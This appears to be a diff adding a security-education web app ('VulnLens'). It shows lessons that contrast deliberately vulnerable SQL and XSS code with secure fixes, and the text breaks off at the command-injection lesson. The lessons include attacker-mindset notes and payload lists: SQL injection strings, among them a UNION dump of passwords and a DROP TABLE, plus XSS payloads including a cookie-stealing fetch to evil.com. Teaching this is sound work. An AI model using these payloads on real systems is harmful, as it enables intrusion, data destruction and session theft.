@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnLens — Security Education Platform</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.3.0/tabler-icons.min.css">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --c-bg:#0d1117;--c-surface:#161b22;--c-surface2:#21262d;
+  --c-border:#30363d;--c-text:#e6edf3;--c-muted:#8b949e;
+  --c-green:#3fb950;--c-red:#f85149;--c-yellow:#d29922;
+  --c-blue:#58a6ff;--c-purple:#bc8cff;--c-orange:#f0883e;
+  --mono:'JetBrains Mono',Consolas,monospace
+}
+html,body{background:var(--c-bg);color:var(--c-text);font-family:-apple-system,'Segoe UI',sans-serif;font-size:14px;line-height:1.6;min-height:100vh}
+a{color:var(--c-blue);text-decoration:none}
+.mono{font-family:var(--mono);font-size:12px}
+
+/* NAV */
+.nav{background:var(--c-surface);border-bottom:1px solid var(--c-border);padding:0 16px;display:flex;align-items:center;gap:0;overflow-x:auto;scrollbar-width:none;position:sticky;top:0;z-index:100}
+.nav::-webkit-scrollbar{display:none}
+.nav-brand{font-weight:700;font-size:15px;color:var(--c-blue);padding:12px 16px 12px 0;border-right:1px solid var(--c-border);margin-right:8px;white-space:nowrap;display:flex;align-items:center;gap:6px}
+.nav-brand span{color:var(--c-green)}
+.nav-tab{padding:12px 14px;cursor:pointer;border-bottom:2px solid transparent;color:var(--c-muted);font-size:13px;white-space:nowrap;transition:color .15s,border-color .15s;background:none;border-top:none;border-left:none;border-right:none}
+.nav-tab:hover{color:var(--c-text)}
+.nav-tab.active{color:var(--c-blue);border-bottom-color:var(--c-blue)}
+
+/* LAYOUT */
+.main{display:grid;grid-template-columns:220px 1fr;min-height:calc(100vh - 45px)}
+.sidebar{background:var(--c-surface);border-right:1px solid var(--c-border);padding:12px 0;overflow-y:auto;height:calc(100vh - 45px);position:sticky;top:45px}
+.sidebar-section{font-size:11px;font-weight:600;color:var(--c-muted);padding:8px 16px 4px;text-transform:uppercase;letter-spacing:.06em}
+.sidebar-item{padding:6px 16px;cursor:pointer;color:var(--c-muted);font-size:13px;display:flex;align-items:center;gap:8px;border-left:2px solid transparent;transition:all .15s}
+.sidebar-item:hover{color:var(--c-text);background:var(--c-surface2)}
+.sidebar-item.active{color:var(--c-blue);background:rgba(88,166,255,.08);border-left-color:var(--c-blue)}
+.sidebar-item .badge{font-size:10px;padding:1px 6px;border-radius:10px;margin-left:auto}
+.badge-crit{background:rgba(248,81,73,.15);color:#f85149}
+.badge-high{background:rgba(240,136,62,.15);color:#f0883e}
+.badge-med{background:rgba(210,153,34,.15);color:#d29922}
+.badge-low{background:rgba(63,185,80,.15);color:#3fb950}
+.content{overflow-y:auto;padding:24px;max-width:900px}
+
+/* LESSON */
+.lesson-header{margin-bottom:20px}
+.lesson-title{font-size:22px;font-weight:700;color:var(--c-text);display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.lesson-subtitle{color:var(--c-muted);font-size:14px;margin-top:6px}
+.tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.tag{font-size:11px;padding:2px 8px;border-radius:12px;font-weight:500}
+.tag-owasp{background:rgba(188,140,255,.15);color:#bc8cff}
+.tag-cwe{background:rgba(88,166,255,.12);color:#58a6ff}
+.tag-lang{background:rgba(63,185,80,.1);color:#3fb950}
+.section{margin-bottom:24px}
+.section-title{font-size:13px;font-weight:600;color:var(--c-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.section-title::after{content:'';flex:1;height:1px;background:var(--c-border)}
+.card{background:var(--c-surface);border:1px solid var(--c-border);border-radius:8px;padding:16px;margin-bottom:12px}
+
+/* CODE */
+.code-block{background:var(--c-bg);border:1px solid var(--c-border);border-radius:8px;overflow:hidden;margin-bottom:12px}
+.code-header{background:var(--c-surface);border-bottom:1px solid var(--c-border);padding:8px 14px;display:flex;align-items:center;justify-content:space-between}
+.code-filename{font-size:12px;color:var(--c-muted);display:flex;align-items:center;gap:6px}
+.code-dot{width:8px;height:8px;border-radius:50%;display:inline-block}
+.code-body{padding:16px;overflow-x:auto;line-height:1.8}
+.lang-tabs{display:flex;gap:0;margin-bottom:12px;border-bottom:1px solid var(--c-border)}
+.lang-tab{padding:6px 14px;cursor:pointer;font-size:12px;color:var(--c-muted);border-bottom:2px solid transparent;transition:all .15s;background:none;border-top:none;border-left:none;border-right:none}
+.lang-tab:hover{color:var(--c-text)}
+.lang-tab.active{color:var(--c-blue);border-bottom-color:var(--c-blue)}
+
+/* PANELS */
+.hacker-panel{background:var(--c-bg);border:1px solid var(--c-red);border-radius:8px;padding:16px;margin-bottom:12px;position:relative}
+.hacker-panel::before{content:'🔴 ATTACKER MINDSET';position:absolute;top:-9px;left:12px;background:var(--c-bg);padding:0 6px;font-size:10px;font-weight:700;color:var(--c-red);letter-spacing:.08em}
+.thought-item{display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:1px solid #1a2030}
+.thought-item:last-child{border-bottom:none}
+.thought-num{color:var(--c-red);font-weight:700;font-family:monospace;font-size:13px;min-width:20px}
+.thought-text{color:var(--c-text);font-size:13px;line-height:1.5}
+.safe-panel{background:var(--c-bg);border:1px solid var(--c-green);border-radius:8px;padding:16px;margin-bottom:12px;position:relative}
+.safe-panel::before{content:'🟢 SECURE VERSION';position:absolute;top:-9px;left:12px;background:var(--c-bg);padding:0 6px;font-size:10px;font-weight:700;color:var(--c-green);letter-spacing:.08em}
+
+/* FLOW */
+.flow-viz{background:var(--c-bg);border:1px solid var(--c-border);border-radius:8px;padding:16px;margin-bottom:12px}
+.flow-row{display:flex;align-items:center;gap:8px;margin-bottom:8px;flex-wrap:wrap}
+.flow-box{padding:6px 12px;border-radius:6px;font-size:12px;font-weight:500;font-family:monospace}
+.flow-arrow{color:var(--c-muted);font-size:18px}
+.flow-red{background:rgba(248,81,73,.15);color:#f85149;border:1px solid rgba(248,81,73,.3)}
+.flow-yellow{background:rgba(210,153,34,.12);color:#d29922;border:1px solid rgba(210,153,34,.25)}
+.flow-green{background:rgba(63,185,80,.1);color:#3fb950;border:1px solid rgba(63,185,80,.2)}
+.flow-blue{background:rgba(88,166,255,.1);color:#58a6ff;border:1px solid rgba(88,166,255,.2)}
+
+/* CODE COLORS */
+.kw-red{color:#f85149}.kw-blue{color:#58a6ff}.kw-green{color:#3fb950}
+.kw-yellow{color:#d29922}.kw-purple{color:#bc8cff}.kw-orange{color:#f0883e}
+.kw-muted{color:#8b949e}
+.highlight-line{background:rgba(248,81,73,.08);display:block;border-left:3px solid #f85149;padding-left:12px;margin:0 -16px;padding-right:16px}
+.highlight-safe{background:rgba(63,185,80,.06);display:block;border-left:3px solid #3fb950;padding-left:12px;margin:0 -16px;padding-right:16px}
+
+/* ATTACK SIM */
+.attack-sim{background:var(--c-bg);border:1px solid var(--c-red);border-radius:8px;overflow:hidden;margin-bottom:12px}
+.sim-header{background:#1a0808;padding:10px 14px;border-bottom:1px solid var(--c-red);display:flex;align-items:center;gap:8px;font-size:12px;color:var(--c-red);font-weight:600}
+.sim-body{padding:16px}
+.sim-input-row{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.sim-input{flex:1;min-width:160px;padding:7px 10px;background:var(--c-surface);border:1px solid var(--c-border);border-radius:6px;color:var(--c-text);font-family:monospace;font-size:13px}
+.sim-input:focus{outline:none;border-color:var(--c-blue)}
+.sim-output{background:var(--c-bg);border:1px solid var(--c-border);border-radius:6px;padding:12px;font-family:monospace;font-size:12px;min-height:60px;color:var(--c-muted);white-space:pre-wrap}
+.sim-output .danger{color:#f85149;font-weight:600}
+.sim-output .normal{color:#3fb950}
+.payload-chip{padding:4px 8px;background:var(--c-surface2);border:1px solid var(--c-border);border-radius:4px;cursor:pointer;font-size:11px;font-family:monospace;color:#d29922;transition:all .15s;margin:2px}
+.payload-chip:hover{border-color:#d29922;background:rgba(210,153,34,.08)}
+
+/* BUTTONS */
+.btn{padding:7px 14px;border-radius:6px;font-size:13px;cursor:pointer;border:1px solid;font-weight:500;transition:all .15s;display:inline-flex;align-items:center;gap:6px}
+.btn-primary{background:rgba(88,166,255,.12);border-color:var(--c-blue);color:var(--c-blue)}
+.btn-primary:hover{background:rgba(88,166,255,.2)}
+.btn-danger{background:rgba(248,81,73,.1);border-color:var(--c-red);color:var(--c-red)}
+.btn-danger:hover{background:rgba(248,81,73,.18)}
+.btn-success{background:rgba(63,185,80,.1);border-color:var(--c-green);color:var(--c-green)}
+
+/* PRACTICE */
+.practice-card{background:var(--c-surface);border:1px solid var(--c-border);border-radius:8px;overflow:hidden;margin-bottom:16px}
+.practice-code{background:var(--c-bg);padding:16px;border-bottom:1px solid var(--c-border);font-family:var(--mono);font-size:12px;line-height:1.7;color:#c9d1d9;white-space:pre}
+.practice-q{padding:16px}
+.practice-options{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px}
+.opt-btn{padding:10px 14px;background:var(--c-surface2);border:1px solid var(--c-border);border-radius:6px;color:var(--c-text);cursor:pointer;font-size:13px;text-align:left;transition:all .15s;width:100%}
+.opt-btn:hover:not(:disabled){border-color:var(--c-blue);background:rgba(88,166,255,.08)}
+.opt-btn.correct{border-color:#3fb950;background:rgba(63,185,80,.1);color:#3fb950}
+.opt-btn.wrong{border-color:#f85149;background:rgba(248,81,73,.08);color:#f85149}
+.opt-btn:disabled{cursor:default}
+.feedback{padding:12px 16px;border-radius:6px;margin-top:12px;font-size:13px;display:none}
+.feedback.show{display:block}
+.feedback.correct{background:rgba(63,185,80,.1);border:1px solid rgba(63,185,80,.3);color:#3fb950}
+.feedback.wrong{background:rgba(248,81,73,.08);border:1px solid rgba(248,81,73,.2);color:#f85149}
+
+/* DASHBOARD */
+.stat-row{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
+.stat-card{background:var(--c-surface);border:1px solid var(--c-border);border-radius:8px;padding:14px;text-align:center}
+.stat-num{font-size:26px;font-weight:700;color:var(--c-blue)}
+.stat-label{font-size:12px;color:var(--c-muted);margin-top:2px}
+.achievement{display:flex;align-items:center;gap:10px;padding:10px;background:var(--c-bg);border:1px solid var(--c-border);border-radius:6px;margin-bottom:8px}
+.progress-bar-wrap{background:var(--c-surface2);border-radius:4px;height:6px;margin-top:6px}
+.progress-bar{background:linear-gradient(90deg,var(--c-blue),var(--c-green));height:100%;border-radius:4px;transition:width .4s}
+
+/* GLOSSARY */
+.glossary-grid{display:grid;gap:10px}
+.glossary-item{background:var(--c-surface);border:1px solid var(--c-border);border-radius:8px;padding:14px}
+.glossary-term{font-size:14px;font-weight:600;color:var(--c-blue);margin-bottom:4px}
+.glossary-def{font-size:13px;color:var(--c-muted);line-height:1.5}
+
+/* EXPLORER */
+.vuln-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
+.vuln-card{background:var(--c-surface);border:1px solid var(--c-border);border-radius:8px;padding:14px;cursor:pointer;transition:border-color .15s}
+
+/* ANALYZER */
+.analyzer-wrap{display:grid;grid-template-columns:1fr 1fr;gap:16px;min-height:400px}
+.analyzer-pane label{font-size:12px;color:var(--c-muted);margin-bottom:6px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;display:block}
+textarea.analyzer-input{width:100%;height:340px;background:var(--c-surface);border:1px solid var(--c-border);border-radius:8px;padding:14px;color:var(--c-text);font-family:var(--mono);font-size:12px;line-height:1.7;resize:none}
+textarea.analyzer-input:focus{outline:none;border-color:var(--c-blue)}
+.analyzer-output{height:340px;background:var(--c-bg);border:1px solid var(--c-border);border-radius:8px;padding:14px;overflow-y:auto;font-size:13px;line-height:1.6}
+select.filter-select{padding:7px 10px;background:var(--c-surface);border:1px solid var(--c-border);border-radius:6px;color:var(--c-text);font-size:13px}
+input.filter-input{padding:7px 10px;background:var(--c-surface);border:1px solid var(--c-border);border-radius:6px;color:var(--c-text);font-size:13px;width:200px}
+
+/* PAGES */
+.page{display:none}
+.page.active{display:block}
+#page-learn .main{display:grid;grid-template-columns:220px 1fr}
+
+/* MISC */
+.fade-in{animation:fadeIn .25s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.pulsing{animation:pulse 1.2s infinite;display:inline-block}
+.separator{height:1px;background:var(--c-border);margin:16px 0}
+.page-pad{padding:24px;max-width:900px}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="nav" role="navigation" aria-label="Main navigation">
+  <div class="nav-brand"><i class="ti ti-shield-lock" aria-hidden="true"></i> Vuln<span>Lens</span></div>
+  <button class="nav-tab active" onclick="showPage('learn')" id="ntab-learn">Learn</button>
+  <button class="nav-tab" onclick="showPage('explorer')" id="ntab-explorer">Explorer</button>
+  <button class="nav-tab" onclick="showPage('analyzer')" id="ntab-analyzer">Code Analyzer</button>
+  <button class="nav-tab" onclick="showPage('practice')" id="ntab-practice">Practice Lab</button>
+  <button class="nav-tab" onclick="showPage('glossary')" id="ntab-glossary">Glossary</button>
+  <button class="nav-tab" onclick="showPage('dashboard')" id="ntab-dashboard">Dashboard</button>
+</nav>
+
+<!-- LEARN PAGE -->
+<div id="page-learn" class="page active">
+  <div class="main">
+    <aside class="sidebar" aria-label="Vulnerability list">
+      <div class="sidebar-section">Critical</div>
+      <div class="sidebar-item active" onclick="loadLesson('sqli')" id="si-sqli"><i class="ti ti-database" aria-hidden="true"></i> SQL Injection <span class="badge badge-crit">CRIT</span></div>
+      <div class="sidebar-item" onclick="loadLesson('xss')" id="si-xss"><i class="ti ti-code" aria-hidden="true"></i> XSS <span class="badge badge-crit">CRIT</span></div>
+      <div class="sidebar-item" onclick="loadLesson('cmdi')" id="si-cmdi"><i class="ti ti-terminal-2" aria-hidden="true"></i> Command Injection <span class="badge badge-crit">CRIT</span></div>
+      <div class="sidebar-section">High</div>
+      <div class="sidebar-item" onclick="loadLesson('ssrf')" id="si-ssrf"><i class="ti ti-network" aria-hidden="true"></i> SSRF <span class="badge badge-high">HIGH</span></div>
+      <div class="sidebar-item" onclick="loadLesson('idor')" id="si-idor"><i class="ti ti-lock-open" aria-hidden="true"></i> IDOR <span class="badge badge-high">HIGH</span></div>
+      <div class="sidebar-item" onclick="loadLesson('csrf')" id="si-csrf"><i class="ti ti-refresh-alert" aria-hidden="true"></i> CSRF <span class="badge badge-high">HIGH</span></div>
+      <div class="sidebar-section">Medium</div>
+      <div class="sidebar-item" onclick="loadLesson('path')" id="si-path"><i class="ti ti-folder-open" aria-hidden="true"></i> Path Traversal <span class="badge badge-med">MED</span></div>
+      <div class="sidebar-item" onclick="loadLesson('xxe')" id="si-xxe"><i class="ti ti-file-code" aria-hidden="true"></i> XXE <span class="badge badge-med">MED</span></div>
+      <div class="sidebar-item" onclick="loadLesson('redirect')" id="si-redirect"><i class="ti ti-external-link" aria-hidden="true"></i> Open Redirect <span class="badge badge-med">MED</span></div>
+      <div class="sidebar-section">Low</div>
+      <div class="sidebar-item" onclick="loadLesson('jwt')" id="si-jwt"><i class="ti ti-key" aria-hidden="true"></i> JWT Mistakes <span class="badge badge-low">LOW</span></div>
+    </aside>
+    <main class="content" id="lesson-content" role="main" aria-live="polite"></main>
+  </div>
+</div>
+
+<!-- EXPLORER PAGE -->
+<div id="page-explorer" class="page">
+  <div class="page-pad">
+    <h1 style="font-size:20px;font-weight:700;margin-bottom:6px">Vulnerability Explorer</h1>
+    <p style="color:var(--c-muted);font-size:13px;margin-bottom:16px">Browse all vulnerability types. Filter by severity, OWASP category, or search by name.</p>
+    <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
+      <select class="filter-select" id="filter-sev" onchange="filterVulns()">
+        <option value="">All severities</option>
+        <option value="CRIT">Critical</option>
+        <option value="HIGH">High</option>
+        <option value="MED">Medium</option>
+        <option value="LOW">Low</option>
+      </select>
+      <select class="filter-select" id="filter-owasp" onchange="filterVulns()">
+        <option value="">All OWASP categories</option>
+        <option value="A01">A01 - Broken Access Control</option>
+        <option value="A02">A02 - Cryptographic Failures</option>
+        <option value="A03">A03 - Injection</option>
+        <option value="A05">A05 - Security Misconfiguration</option>
+        <option value="A07">A07 - Auth Failures</option>
+        <option value="A08">A08 - Software Integrity</option>
+        <option value="A10">A10 - SSRF</option>
+      </select>
+      <input type="search" class="filter-input" id="filter-search" placeholder="Search vulnerabilities…" oninput="filterVulns()" aria-label="Search vulnerabilities">
+    </div>
+    <div class="vuln-grid" id="vuln-grid" aria-label="Vulnerability cards"></div>
+  </div>
+</div>
+
+<!-- ANALYZER PAGE -->
+<div id="page-analyzer" class="page">
+  <div class="page-pad">
+    <h1 style="font-size:20px;font-weight:700;margin-bottom:6px">Interactive Code Analyzer</h1>
+    <p style="color:var(--c-muted);font-size:13px;margin-bottom:20px">Paste code below. The AI tutor will identify vulnerabilities, trace data flow, and explain every issue line-by-line.</p>
+    <div class="analyzer-wrap">
+      <div class="analyzer-pane">
+        <label for="analyzer-input">Your code</label>
+        <textarea class="analyzer-input" id="analyzer-input" spellcheck="false" placeholder="Paste your code here…">$user = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id=" . $user;
+$result = mysql_query($sql);
+if($result){
+  echo "Welcome " . $_GET['name'];
+}</textarea>
+        <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap;align-items:center">
+          <select class="filter-select" id="analyzer-lang">
+            <option value="PHP">PHP</option>
+            <option value="Python">Python</option>
+            <option value="JavaScript">JavaScript / Node.js</option>
+            <option value="Java">Java</option>
+            <option value="Go">Go</option>
+            <option value="Ruby">Ruby</option>
+          </select>
+          <button class="btn btn-danger" onclick="analyzeCode()" id="analyze-btn"><i class="ti ti-scan" aria-hidden="true"></i> Analyze Code</button>
+        </div>
+      </div>
+      <div class="analyzer-pane">
+        <label>AI Analysis</label>
+        <div class="analyzer-output" id="analyzer-output">
+          <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;color:var(--c-muted)">
+            <i class="ti ti-scan" style="font-size:32px;color:var(--c-border);margin-bottom:12px" aria-hidden="true"></i>
+            <div>Paste code and click <strong style="color:var(--c-blue)">Analyze Code</strong><br>to identify vulnerabilities with AI</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PRACTICE PAGE -->
+<div id="page-practice" class="page">
+  <div class="page-pad">
+    <h1 style="font-size:20px;font-weight:700;margin-bottom:6px">Practice Lab</h1>
+    <p style="color:var(--c-muted);font-size:13px;margin-bottom:20px">Identify vulnerabilities in real-world-style code snippets. Score points and build your hacker eye.</p>
+    <div id="challenge-container"></div>
+  </div>
+</div>
+
+<!-- GLOSSARY PAGE -->
+<div id="page-glossary" class="page">
+  <div class="page-pad">
+    <h1 style="font-size:20px;font-weight:700;margin-bottom:6px">Security Glossary</h1>
+    <p style="color:var(--c-muted);font-size:13px;margin-bottom:20px">Quick reference for key security terms, concepts, and jargon used by security researchers.</p>
+    <div class="glossary-grid" id="glossary-items"></div>
+  </div>
+</div>
+
+<!-- DASHBOARD PAGE -->
+<div id="page-dashboard" class="page">
+  <div class="page-pad">
+    <h1 style="font-size:20px;font-weight:700;margin-bottom:20px">Your Progress</h1>
+    <div class="stat-row">
+      <div class="stat-card"><div class="stat-num" id="stat-lessons">3</div><div class="stat-label">Lessons completed</div></div>
+      <div class="stat-card"><div class="stat-num" id="stat-score">850</div><div class="stat-label">Total score</div></div>
+      <div class="stat-card"><div class="stat-num" id="stat-streak">4</div><div class="stat-label">Day streak 🔥</div></div>
+    </div>
+    <div class="section-title" style="font-size:13px;font-weight:600;color:var(--c-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:12px;display:flex;align-items:center;gap:8px">Achievements <span style="flex:1;height:1px;background:var(--c-border);display:block"></span></div>
+    <div id="achievements-list"></div>
+    <div class="section-title" style="font-size:13px;font-weight:600;color:var(--c-muted);text-transform:uppercase;letter-spacing:.06em;margin:20px 0 12px;display:flex;align-items:center;gap:8px">Topic mastery <span style="flex:1;height:1px;background:var(--c-border);display:block"></span></div>
+    <div id="mastery-bars"></div>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// DATA: LESSONS
+// ============================================================
+const LESSONS = {
+sqli:{
+  title:'SQL Injection',subtitle:'Manipulating database queries via unsanitized user input',
+  severity:'CRIT',owasp:'A03:2021',cwe:'CWE-89',
+  langs:['PHP','Python','Node.js','Java'],
+  analogy:'Imagine you hand a note to a bank teller asking to check your balance. The teller reads the note aloud to a robot clerk. If you write "check balance AND also give me everyone else\'s money", the robot might comply literally — it just follows instructions. SQL injection works exactly like this.',
+  steps:['Where does user input enter?','How is it used in the query?','Is it validated or escaped?','What query is actually executed?','What data can be leaked?'],
+  vulnCode:{
+    PHP:`<span class="kw-purple">$id</span> = <span class="kw-yellow">$_GET</span>[<span class="kw-orange">'id'</span>];\n<span class="highlight-line"><span class="kw-purple">$sql</span> = <span class="kw-orange">"SELECT * FROM users WHERE id="</span> . <span class="kw-purple">$id</span>;</span>\n<span class="highlight-line"><span class="kw-purple">$res</span> = <span class="kw-blue">mysql_query</span>(<span class="kw-purple">$sql</span>);</span>\n<span class="kw-purple">$row</span> = <span class="kw-blue">mysql_fetch_assoc</span>(<span class="kw-purple">$res</span>);\n<span class="kw-blue">echo</span> <span class="kw-orange">"Hello, "</span> . <span class="kw-purple">$row</span>[<span class="kw-orange">'name'</span>];`,
+    Python:`<span class="kw-blue">from</span> flask <span class="kw-blue">import</span> request\n<span class="kw-blue">import</span> sqlite3\n\n<span class="kw-purple">user_id</span> = request.args.get(<span class="kw-orange">'id'</span>)\n<span class="highlight-line"><span class="kw-purple">query</span> = <span class="kw-orange">f"SELECT * FROM users WHERE id={user_id}"</span></span>\n<span class="kw-purple">conn</span> = sqlite3.connect(<span class="kw-orange">'db.sqlite'</span>)\n<span class="highlight-line"><span class="kw-purple">result</span> = conn.execute(<span class="kw-purple">query</span>).fetchone()</span>`,
+    'Node.js':`<span class="kw-blue">const</span> <span class="kw-purple">id</span> = req.query.id;\n<span class="highlight-line"><span class="kw-blue">const</span> <span class="kw-purple">sql</span> = \`SELECT * FROM users WHERE id=\${id}\`;</span>\n<span class="highlight-line">db.query(<span class="kw-purple">sql</span>, (<span class="kw-purple">err</span>, <span class="kw-purple">rows</span>) => {</span>\n  res.json(<span class="kw-purple">rows</span>[<span class="kw-green">0</span>]);\n});`,
+    Java:`<span class="kw-blue">String</span> id = request.getParameter(<span class="kw-orange">"id"</span>);\n<span class="highlight-line"><span class="kw-blue">String</span> sql = <span class="kw-orange">"SELECT * FROM users WHERE id="</span> + id;</span>\n<span class="highlight-line">Statement stmt = conn.createStatement();</span>\n<span class="highlight-line">ResultSet rs = stmt.executeQuery(sql);</span>`
+  },
+  secureCode:{
+    PHP:`<span class="kw-purple">$id</span> = <span class="kw-blue">filter_input</span>(<span class="kw-yellow">INPUT_GET</span>, <span class="kw-orange">'id'</span>, <span class="kw-yellow">FILTER_VALIDATE_INT</span>);\n<span class="kw-blue">if</span> (!<span class="kw-purple">$id</span>) <span class="kw-blue">die</span>(<span class="kw-orange">'Invalid ID'</span>);\n<span class="highlight-safe"><span class="kw-purple">$stmt</span> = <span class="kw-purple">$pdo</span>-><span class="kw-blue">prepare</span>(<span class="kw-orange">"SELECT * FROM users WHERE id = ?"</span>);</span>\n<span class="highlight-safe"><span class="kw-purple">$stmt</span>-><span class="kw-blue">execute</span>([<span class="kw-purple">$id</span>]);</span>\n<span class="kw-purple">$row</span> = <span class="kw-purple">$stmt</span>-><span class="kw-blue">fetch</span>();`,
+    Python:`<span class="kw-blue">from</span> flask <span class="kw-blue">import</span> request\n<span class="kw-blue">import</span> sqlite3\n\n<span class="kw-purple">user_id</span> = request.args.get(<span class="kw-orange">'id'</span>)\n<span class="highlight-safe"><span class="kw-purple">query</span> = <span class="kw-orange">"SELECT * FROM users WHERE id=?"</span></span>\n<span class="highlight-safe"><span class="kw-purple">result</span> = conn.execute(<span class="kw-purple">query</span>, (<span class="kw-purple">user_id</span>,)).fetchone()</span>`,
+    'Node.js':`<span class="kw-blue">const</span> <span class="kw-purple">id</span> = req.query.id;\n<span class="highlight-safe"><span class="kw-blue">const</span> <span class="kw-purple">sql</span> = <span class="kw-orange">'SELECT * FROM users WHERE id = ?'</span>;</span>\n<span class="highlight-safe">db.query(<span class="kw-purple">sql</span>, [<span class="kw-purple">id</span>], (<span class="kw-purple">err</span>, <span class="kw-purple">rows</span>) => {</span>\n  res.json(<span class="kw-purple">rows</span>[<span class="kw-green">0</span>]);\n});`,
+    Java:`<span class="highlight-safe"><span class="kw-blue">PreparedStatement</span> stmt = conn.prepareStatement(<span class="kw-orange">"SELECT * FROM users WHERE id=?"</span>);</span>\n<span class="highlight-safe">stmt.setString(<span class="kw-green">1</span>, request.getParameter(<span class="kw-orange">"id"</span>));</span>\n<span class="kw-blue">ResultSet</span> rs = stmt.executeQuery();`
+  },
+  thoughts:[
+    {t:"I see id comes directly from GET parameters — zero filtering."},
+    {t:"The query uses string concatenation. The input becomes part of the SQL."},
+    {t:"No prepared statements, no parameterized queries anywhere."},
+    {t:"I can inject: ?id=1 OR 1=1-- to return ALL rows."},
+    {t:"Or: ?id=1 UNION SELECT username,password,null FROM users--"},
+    {t:"This leaks the entire users table, including password hashes."}
+  ],
+  payloads:["1 OR 1=1--","1 UNION SELECT 1,2,3--","' OR 'x'='x","1; DROP TABLE users--"]
+},
+xss:{
+  title:'Cross-Site Scripting (XSS)',subtitle:'Injecting malicious scripts into pages viewed by other users',
+  severity:'CRIT',owasp:'A03:2021',cwe:'CWE-79',
+  langs:['JavaScript','PHP','Python','React'],
+  analogy:'Imagine a bulletin board at your office. Anyone can post a note. One day, a malicious employee posts a note that says "Read this!" — but the note contains a hidden microphone. Every colleague who reads the note is now being secretly recorded. XSS works the same way: your app is the bulletin board, and the script is the hidden microphone.',
+  steps:["Where does user-controlled data appear in the page?","Is it sanitized before rendering?","Could a script tag survive the process?","What's the browser trust level of this page?","What data can the injected script access?"],
+  vulnCode:{
+    JavaScript:`<span class="kw-muted">// Express route</span>\n<span class="kw-purple">app</span>.<span class="kw-blue">get</span>(<span class="kw-orange">'/search'</span>, (<span class="kw-purple">req</span>, <span class="kw-purple">res</span>) => {\n  <span class="kw-blue">const</span> <span class="kw-purple">query</span> = req.query.q;\n<span class="highlight-line">  res.<span class="kw-blue">send</span>(\`Results for: \${query}\`);</span>\n});`,
+    PHP:`<span class="kw-purple">$q</span> = <span class="kw-yellow">$_GET</span>[<span class="kw-orange">'q'</span>];\n<span class="highlight-line"><span class="kw-blue">echo</span> <span class="kw-orange">"You searched for: "</span> . <span class="kw-purple">$q</span>;</span>`,
+    Python:`<span class="kw-purple">q</span> = request.args.get(<span class="kw-orange">'q'</span>, <span class="kw-orange">''</span>)\n<span class="highlight-line"><span class="kw-blue">return</span> <span class="kw-orange">f"&lt;p&gt;You searched: {q}&lt;/p&gt;"</span></span>`,
+    React:`<span class="kw-muted">// DANGEROUS — never use dangerouslySetInnerHTML with user input</span>\n<span class="highlight-line"><span class="kw-blue">return</span> &lt;<span class="kw-purple">div</span> dangerouslySetInnerHTML={{__html: userInput}} /&gt;;</span>`
+  },
+  secureCode:{
+    JavaScript:`<span class="kw-blue">const</span> <span class="kw-purple">escapeHtml</span> = (<span class="kw-purple">s</span>) =>\n  s.replace(<span class="kw-yellow">/&/g</span>,<span class="kw-orange">'&amp;amp;'</span>).replace(<span class="kw-yellow">/&lt;/g</span>,<span class="kw-orange">'&amp;lt;'</span>)\n   .replace(<span class="kw-yellow">/&gt;/g</span>,<span class="kw-orange">'&amp;gt;'</span>).replace(<span class="kw-yellow">/"/g</span>,<span class="kw-orange">'&amp;quot;'</span>);\n<span class="highlight-safe">res.<span class="kw-blue">send</span>(\`Results for: \${<span class="kw-purple">escapeHtml</span>(query)}\`);</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-blue">echo</span> <span class="kw-orange">"You searched for: "</span> . <span class="kw-blue">htmlspecialchars</span>(<span class="kw-purple">$q</span>, <span class="kw-yellow">ENT_QUOTES</span>, <span class="kw-orange">'UTF-8'</span>);</span>`,
+    Python:`<span class="kw-blue">from</span> markupsafe <span class="kw-blue">import</span> escape\n<span class="highlight-safe"><span class="kw-blue">return</span> <span class="kw-orange">f"&lt;p&gt;You searched: {escape(q)}&lt;/p&gt;"</span></span>`,
+    React:`<span class="kw-muted">// React auto-escapes JSX — just use it normally</span>\n<span class="highlight-safe"><span class="kw-blue">return</span> &lt;<span class="kw-purple">div</span>&gt;{userInput}&lt;/<span class="kw-purple">div</span>&gt;;</span>\n<span class="kw-muted">// If HTML needed: sanitize with DOMPurify first</span>`
+  },
+  thoughts:[
+    {t:"User input from ?q= is directly embedded in the HTML response."},
+    {t:"I can inject: ?q=<script>alert(document.cookie)</script>"},
+    {t:"If session cookies lack HttpOnly, I can steal them."},
+    {t:"Stored XSS is worse: persist payload in a comment/profile field."},
+    {t:"Every visitor then executes my script in their browser context."},
+    {t:"I can redirect, keylog, or exfiltrate auth tokens silently."}
+  ],
+  payloads:["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg onload=alert(1)>","<script>fetch('//evil.com?c='+document.cookie)</script>"]
+},
+cmdi:{
+  title:'Command Injection',subtitle:'Executing arbitrary OS commands via unsanitized user input',
+  severity:'CRIT',owasp:'A03:2021',cwe:'CWE-78',
+  langs:['Python','PHP','Node.js','Java'],
